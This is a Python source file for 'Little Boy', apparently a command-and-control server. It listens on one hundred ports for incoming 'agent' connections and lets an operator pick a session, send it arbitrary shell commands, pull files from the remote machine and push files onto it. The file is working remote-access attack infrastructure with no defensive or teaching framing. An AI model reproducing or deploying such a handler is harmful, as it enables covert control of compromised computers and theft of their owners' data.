import socket
import threading
import time
import sys
import queue
import os
import pyfiglet


class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    END = '\033[0m'  # Reset color to default
def print_colored(text, color):
    print(f"{color}{text}{Colors.END}", end='', flush=True)  # Use end='' to avoid adding a newline
def figlet_text(text):
    color=Colors.RED
    ascii_art = pyfiglet.figlet_format(text)
    colored_ascii_art = f"{color}{ascii_art}{Colors.END}"
    return colored_ascii_art


# Dictionary to store active connections, with port numbers as keys
active_connections = {}
# Lock for thread safety when modifying active_connections
connection_lock = threading.Lock()
message_queue = queue.Queue()


def welcome_message():
    print_colored("\n========================================================",Colors.GREEN)
    print()

    example_text = "Little Boy"
    print(figlet_text(example_text))

    print_colored("========================================================",Colors.GREEN)
    print()
    print("Welcome to Little Boy!")
    print("Type 'help' for a list of available commands.")
    print("Type 'exit' to quit the program.")
    print_colored("========================================================",Colors.GREEN)
    print()


def main_menu():
    for port in active_connections:
        print(f"Port: {port}")



def handle_connection(client_socket, port):
    client_socket.settimeout(10)  # Set a more reasonable timeout
    while True:
        try:
            # Initialize an empty response
            full_response = ""
            while True:
                # Receive data in chunks
                data = client_socket.recv(4096).decode()
                if not data:
                    break
                full_response += data

            if full_response:
                print(f"Received result from Agent {port}: {full_response}")
                message_queue.put(f"Received data on port {port}: {full_response}")
            else:
                raise ConnectionError(f"Connection on port {port} closed by client.")

        except socket.timeout:
            break  # Break the loop if a timeout occurs

        except ConnectionError as ce:
            message_queue.put(ce)
            break


def print_messages():
    while True:
        try:
            listening_message = message_queue.get(timeout=1)  # Set a timeout to avoid blocking indefinitely
            print(listening_message)
        except queue.Empty:
            break


def receive_file(client_socket, file_name, file_size):
    try:
        with open(file_name, 'wb') as file:
            bytes_received = 0
            while bytes_received < file_size:
                data = client_socket.recv(4096)
                if not data:
                    break
                file.write(data)
                bytes_received += len(data)

        # Send acknowledgment to the agent
        client_socket.send("ReceivedFile".encode('utf-8'))
        print(f"File '{file_name}' downloaded successfully.")
    except Exception as e:
        print(f"Error while receiving '{file_name}': {str(e)}")


exit_requested = False


def start_listener(port):
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.bind(('0.0.0.0', port))
    listener.listen(5)

    while True:
        client_socket, client_address = listener.accept()
        print(f"\nConnection on port {port} from {client_address}")
        print_colored("Enter a command: ",color=Colors.BLUE)
        # Assign a unique connection ID
        with connection_lock:
            active_connections[port] = client_socket

        # Start a thread to handle commands for this port
        client_thread = threading.Thread(target=handle_connection, args=(client_socket, port))
        client_thread.start()


# Define the ports you want to listen on
ports_to_listen = [2748, 5327, 6985, 4190, 8451, 1742, 3154, 6938, 8265, 4557,
4859, 5643, 1694, 5372, 8823, 7014, 2987, 7486, 3148, 6172,
4139, 9296, 8932, 1547, 8310, 4822, 3447, 7845, 1783, 6432,
1359, 6157, 9978, 2526, 3689, 6201, 4165, 7582, 4091, 2534,
5673, 4203, 3015, 7194, 1429, 6652, 7539, 4613, 7054, 5817,
9736, 6723, 4886, 1398, 9064, 2257, 6834, 9372, 4271, 7589,
6592, 4761, 8347, 5701, 1904, 8472, 3591, 1234, 9865, 5938,
7142, 8602, 3628, 5418, 2753, 8971, 6314, 8046, 3819, 1847,
5369, 2490, 6982, 5741, 9405, 8023, 5178, 7893, 2804, 1542,
9438, 6823, 5274, 4768, 8150, 6925, 3706, 2819, 6198, 7482
]

if __name__ == "__main__":
    welcome_message()

    # Create a separate thread for message printing
    print_thread = threading.Thread(target=print_messages)
    print_thread.daemon = True
    print_thread.start()

    # Start listeners for each port
    for port in ports_to_listen:
        listener_thread = threading.Thread(target=start_listener, args=(port,))
        listener_thread.start()

    time.sleep(1)
    print_messages()

    # Main menu loop for managing active ports
    while True:
        main_menu()
        print_colored("Enter a command: ", color=Colors.BLUE)
        choice = input()
        if choice == "help" or choice == "?":
            print_colored("'help' or '?' ", Colors.RED)
            print("- to get help")
            print_colored("'list'", Colors.BLUE)
            print("-to list all available agents")
            print_colored("'exit'",Colors.YELLOW)
            print("- to quit the program ")
            print_colored("'background' or 'bg' ",Colors.GREEN)
            print("- to background an active session.")
            print_colored("Type the session port number to interact with a session.", Colors.RED)
            print()

            continue
        if choice == 'exit':
            sys.exit()

        if choice == 'list':
            # List active sessions
            for agent_id, agent_socket in active_connections.items():
                print(f"Session ID: {agent_id}")
            continue

        try:
            selected_agent_id = int(choice)
            if selected_agent_id in active_connections:
                print(f"Interacting with session ID {selected_agent_id}. Type 'exit' to return to the main menu.")
                agent_socket = active_connections[selected_agent_id]

                while True:
                    print_colored("Enter a command for the agent (or 'exit' to break the connection.):", color=Colors.BLUE)
                    command = input()

                    if command.lower() == "exit":
                        agent_socket.send(command.encode('utf-8'))
                        exit_requested = True
                        active_connections.pop(int(choice))

                        break

                    elif command.lower() == "cls":
                        os.system("cls")

                    elif command.lower() == 'bg' or command.lower() == "background":
                        os.system("cls")
                        break

                    elif command.lower().startswith("download"):
                        agent_socket.send(command.encode('utf-8'))
                        file_name = command.split()[1]
                        file_size_str = agent_socket.recv(1024).decode('utf-8')

                        if not file_size_str.isdigit():
                            print(f"Invalid file size: {file_size_str}")
                            continue

                        file_size = int(file_size_str)
                        receive_file(agent_socket, file_name, file_size)
                        agent_socket.settimeout(5)
                        acknowledgment_received = False
                        try:
                            acknowledgment = agent_socket.recv(1024).decode('utf-8')
                            if acknowledgment == "ReadyForCommands":
                                acknowledgment_received = True
                            else:
                                print("Unexpected acknowledgment received.")
                        except socket.timeout:
                            print("Acknowledgment not received within the timeout.")
                        finally:
                            agent_socket.settimeout(None)

                        if not acknowledgment_received:
                            print("Resuming without acknowledgment.")

                    elif command.lower().startswith("upload"):
                        file_path = command.split()[1]
                        try:
                            with open(file_path, 'rb') as file:
                                file_data = file.read()
                                file_size = len(file_data)

                                # Send the command to the agent
                                agent_socket.send(command.encode('utf-8'))

                                # Send the file size to the agent (as big-endian bytes)
                                agent_socket.sendall(file_size.to_bytes(8, 'big'))

                                # Send the file data to the agent
                                agent_socket.sendall(file_data)
                                print(f"File '{file_path}' sent to the agent.")
                        except FileNotFoundError:
                            print(f"File not found: {file_path}")
                            agent_socket.send("FileNotFound".encode('utf-8'))

                    else:
                        agent_socket.send(command.encode('utf-8'))

                        while True:  # Loop to handle response until termination or timeout
                            agent_socket.settimeout(0.5)  # Set a timeout
                            try:
                                response = agent_socket.recv(4096).decode('utf-8')
                                if not response:
                                    print("Agent Response: No more data")
                                    break  # Break loop if response ends
                                print("Agent Response:")
                                print(response)
                            except socket.timeout:
                                break  # Break loop on timeout
                            except ConnectionError as ce:
                                print(f"Agent Response: Connection closed by the agent.")
                                break  # Break loop on connection closure
            else:
                print("Invalid session ID. Try again.")
        except ValueError:
            print("Invalid input. Try again.")
